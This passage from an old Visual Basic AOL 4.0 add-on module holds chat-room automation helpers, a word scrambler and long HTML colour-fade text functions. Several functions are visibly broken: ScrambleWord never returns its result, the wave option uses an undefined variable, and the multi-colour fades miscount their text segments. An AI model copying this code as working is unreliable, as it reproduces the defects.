S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
r = ShowWindow(IMWin, SW_HIDE)
List.AddItem nme
Call KillListDupes(List)
Exit Sub
End If
End Sub
Function ScrambleWord(Word$)
Dim S, TAK, Y, p, Q, f, W, TEMPT
Static letter(1000)
Static KK(1000)
S = Word$
TAK = 0
For Y = 1 To Len(S)
p = p + 1
letter(p) = Mid(S, Y, 1)
Next Y
For Q = 1 To Len(S) '- 1
againdood:
Randomize Timer
f = Int(Rnd * Len(S) + 1)
If f = 0 Then GoTo againdood
For W = 0 To TAK
If f = KK(W) Then GoTo againdood
Next W
TAK = TAK + 1
KK(TAK) = f
TEMPT = TEMPT & letter(f)
Next Q
End Function
Function Scramble(Word$, frm As Form, lbl As label) As String
Dim Where, SEP$, i, SHIT$
Static Words(256) As String
Static Dick(256) As String
Word$ = Word$
Word$ = Word$ + " "
Do
    Where = InStr(UCase$(Word$), UCase$(" "))
    If Where = False Then Exit Do
    SEP$ = (Mid$(Word$, 1, Where - 1))
    X = X + 1
    Words$(X) = (SEP$)
    Word$ = Mid$(Word$, Where + 1)
Loop
For i = 1 To X
    Dick$(i) = ScrambleWord(Words(i))
Next i
For i = 1 To X
    SHIT$ = SHIT$ + Dick$(i) + " "
Next i
SHIT$ = (SHIT$)
'frm.lbl.Caption = Trim$(shit$)
End Function
Sub AOL40_ReEnterRoom()
Call Keyword("aol://2719:2-2-" + AOL40_GetRoomName())
starttime = Timer
Do While (Timer - starttime < 5)
    DoEvents
    text$ = AOL40_GetChatText()
    If InStr(text$, "OnlineHost:") Then Exit Do
    Full% = FindWindow("#32770", "America Online")
    If Full% <> 0 Then
        Call closewin(Full%)
        Exit Do
    End If
Loop
Call killwait
End Sub
Function AOL40_GetRoomName() As String
On Error Resume Next
AOL40_GetRoomName = getapitext(AOL40_FindChatRoom())
End Function
Function getapitext(hWnd As Integer) As String
X = SendMessageByNum(hWnd%, WM_GETTEXTLENGTH, 0, 0)
    text$ = Space(X + 1)
    X = SendMessageByString(hWnd%, WM_GETTEXT, X + 1, text$)
    getapitext = FixAPIString(text$)
End Function
Function getwintext(hWnd As Integer) As String
lentos = SendMessage(hWnd, WM_GETTEXTLENGTH, 0&, 0&)
Buffer$ = Space$(lentos)
X = SendMessageByString(hWnd, WM_GETTEXT, lentos + 1, Buffer$)
getwintext = Buffer$
End Function
Function AOL40_CurrentRoom()
AOL = FindWindow("AOL Frame25", 0&)
bah = FindChildByClass(AOL, "_AOL_Glyph")
par% = GetParent(bah)
XX$ = getwintext(par%)
AOL40_CurrentRoom = XX$
End Function
Sub FormZoom(frm As Form, CFlag As Integer, steps As Integer)

'use like this -- Call FormZoom(Me, True, 600)

Dim FRect As RECT
Dim fWidth, fHeight As Integer
Dim i, X, Y, cx, cy As Integer
Dim hScreen, Brush As Integer, OldBrush
    GetWindowRect frm.hWnd, FRect
    fWidth = (FRect.Right - FRect.Left)
    fHeight = FRect.Bottom - FRect.Top

    hScreen = GetDC(0)
    Brush = CreateSolidBrush(frm.BackColor)
    OldBrush = SelectObject(hScreen, Brush)
    For i = 1 To steps
        cx = fWidth * (i / steps)
        cy = fHeight * (i / steps)
        If CFlag Then
            X = FRect.Left + (fWidth - cx) / 2
            Y = FRect.Top + (fHeight - cy) / 2
        Else
            X = FRect.Left
            Y = FRect.Top
        End If
        Rectangle hScreen, X, Y, X + cx, Y + cy
    Next i
    If ReleaseDC(0, hScreen) = 0 Then
        MsgBox "Unable to Release Device Context", 16, "Device Error"
    End If
    X = DeleteObject(Brush%)
    frm.Show
End Sub
Function MultiFade(NUMCOLORS%, TheColors(), thetext$, WavY As Boolean)
'by monk-e-god
Dim WaveState%
Dim WaveHTML$
WaveState = 0

If NUMCOLORS < 1 Then
MsgBox "Error: Attempting to fade less than one color."
MultiFade = thetext
Exit Function
End If

If NUMCOLORS = 1 Then
blah$ = RGBtoHEX(TheColors(1))
redpart% = Val("&H" + Right(blah$, 2))
greenpart% = Val("&H" + Mid(blah$, 3, 2))
bluepart% = Val("&H" + Left(blah$, 2))
blah2 = RGB(bluepart%, greenpart%, redpart%)
blah3$ = RGBtoHEX(blah2)

MultiFade = "<Font Color=#" + blah3$ + ">" + thetext
Exit Function
End If

Dim RedList%()
Dim GreenList%()
Dim BlueList%()
Dim DaColors$()
Dim DaLens%()
Dim DaParts$()
Dim Faded$()

ReDim RedList%(NUMCOLORS)
ReDim GreenList%(NUMCOLORS)
ReDim BlueList%(NUMCOLORS)
ReDim DaColors$(NUMCOLORS)
ReDim DaLens%(NUMCOLORS - 1)
ReDim DaParts$(NUMCOLORS - 1)
ReDim Faded$(NUMCOLORS - 1)

For Q% = 1 To NUMCOLORS
DaColors(Q%) = RGBtoHEX(TheColors(Q%))
Next Q%

For W% = 1 To NUMCOLORS
RedList(W%) = Val("&H" + Right(DaColors(W%), 2))
GreenList(W%) = Val("&H" + Mid(DaColors(W%), 3, 2))
BlueList(W%) = Val("&H" + Left(DaColors(W%), 2))
Next W%

textlen% = Len(thetext)
Do: DoEvents
For f% = 1 To (NUMCOLORS - 1)
DaLens(f%) = DaLens(f%) + 1: textlen% = textlen% - 1
If textlen% < 1 Then Exit For
Next f%
Loop Until textlen% < 1
    
DaParts(1) = Left(thetext, DaLens(1))
DaParts(NUMCOLORS - 1) = Right(thetext, DaLens(NUMCOLORS - 1))
    
dastart% = DaLens(1) + 1

If NUMCOLORS > 2 Then
For e% = 2 To NUMCOLORS - 2
DaParts(e%) = Mid(thetext, dastart%, DaLens(e%))
dastart% = dastart% + DaLens(e%)
Next e%
End If

For r% = 1 To (NUMCOLORS - 1)
textlen% = Len(DaParts(r%))
For i = 1 To textlen%
    TextDone$ = Left(DaParts(r%), i)
    LastChr$ = Right(TextDone$, 1)
    colorx = RGB(((BlueList(r% + 1) - BlueList(r%)) / textlen% * i) + BlueList(r%), ((GreenList%(r% + 1) - GreenList(r%)) / textlen% * i) + GreenList(r%), ((RedList(r% + 1) - RedList(r%)) / textlen% * i) + RedList(r%))
    colorx2 = RGBtoHEX(colorx)
        
    If WavY = True Then
    WaveState = WaveState + 1
    If WaveState > 4 Then WaveState = 1
    If WaveState = 1 Then WaveHTML = "<sup>"
    If WaveState = 2 Then WaveHTML = "</sup>"
    If WaveState = 3 Then WaveHTML = "<sub>"
    If WaveState = 4 Then WaveHTML = "</sub>"
    Else
    WaveHTML = ""
    End If
        
    Faded(r%) = Faded(r%) + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
Next i
Next r%

For qwe% = 1 To (NUMCOLORS - 1)
FadedTxtX$ = FadedTxtX$ + Faded(qwe%)
Next qwe%

MultiFade = FadedTxtX$

End Function

Function FadeByColor6(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))
rednum6% = Val("&H" + Right(dacolor6$, 2))
greennum6% = Val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = Val("&H" + Left(dacolor6$, 2))


FadeByColor6 = FadeSixColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, thetext, WavY)

End Function
Function FadeSixColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, thetext$, WavY As Boolean)
'by H8er
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    fifthlen% = fifthlen% + 3: textlen% = textlen% - 2
    If textlen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Right(thetext, fifthlen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part4
    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / textlen% * i) + B4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part5
    textlen% = Len(part5$)
    For i = 1 To textlen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / textlen% * i) + B5, ((G6 - G5) / textlen% * i) + G5, ((R6 - R5) / textlen% * i) + R5)
        colorx2 = RGBtoHEX(colorx)

        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    FadeSixColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$
End Function
Function FadeByColor7(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))
rednum6% = Val("&H" + Right(dacolor6$, 2))
greennum6% = Val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = Val("&H" + Left(dacolor6$, 2))
rednum7% = Val("&H" + Right(dacolor7$, 2))
greennum7% = Val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = Val("&H" + Left(dacolor7$, 2))


FadeByColor7 = FadeSevenColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, thetext, WavY)

End Function
Function FadeSevenColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, thetext$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Right(thetext, sixlen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
         WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part4
    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / textlen% * i) + B4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part5
    textlen% = Len(part5$)
    For i = 1 To textlen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / textlen% * i) + B5, ((G6 - G5) / textlen% * i) + G5, ((R6 - R5) / textlen% * i) + R5)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part6
    textlen% = Len(part6$)
    For i = 1 To textlen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B7 - B6) / textlen% * i) + B6, ((G7 - G6) / textlen% * i) + G6, ((R7 - R6) / textlen% * i) + R6)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i

    FadeSevenColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$
End Function
Function FadeByColor8(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)


rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))
rednum6% = Val("&H" + Right(dacolor6$, 2))
greennum6% = Val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = Val("&H" + Left(dacolor6$, 2))
rednum7% = Val("&H" + Right(dacolor7$, 2))
greennum7% = Val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = Val("&H" + Left(dacolor7$, 2))
rednum8% = Val("&H" + Right(dacolor8$, 2))
greennum8% = Val("&H" + Mid(dacolor8$, 3, 2))
bluenum8% = Val("&H" + Left(dacolor8$, 2))



FadeByColor8 = FadeEightColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, thetext, WavY)

End Function
Function FadeNineColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, R8%, G8%, B8%, R9%, G9%, B9%, thetext$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    eightlen% = eightlen% + 3: textlen% = textlen% - 2
    If textlen% < 1 Then Exit Do
    ninelen% = ninelen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Right(thetext, eightlen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState = 1 Then WaveHTML = "<sup>"
